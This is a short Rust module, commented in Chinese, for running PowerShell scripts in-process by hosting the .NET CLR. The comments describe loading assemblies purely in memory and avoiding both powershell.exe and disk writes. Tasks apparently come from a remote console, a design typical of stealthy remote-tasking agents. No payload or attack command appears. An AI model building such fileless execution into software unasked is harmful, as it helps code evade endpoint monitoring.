//! In-process PowerShell（powershell-inline）共享库。
//!
//! 在宿主进程内托管 .NET CLR 4，从 GAC 加载 System.Management.Automation
//! 执行脚本 —— 不创建 powershell.exe 进程、不写系统 DLL 内存、不落盘
//! （stub 程序集以字节数组经 _AppDomain::Load_3 纯内存加载）。
//!
//! 被以下模块复用：
//!   - powershell 模块（Console 下发的 PowerShell 任务）
//!   - script 模块（rhai 脚本里的 powershell() 函数）
//!
//! 安全边界：CLR 宿主崩溃会影响宿主进程，因此所有托管调用串行化执行；
//! 脚本超时由 stub 内 Task.Wait(timeout) 控制，超时后 ps.Stop()。

pub mod clr_host;

/// 在宿主进程内执行 PowerShell 脚本，返回结果字符串（JSON 或错误描述）。
pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
    clr_host::execute_inline(script, timeout_secs)
}
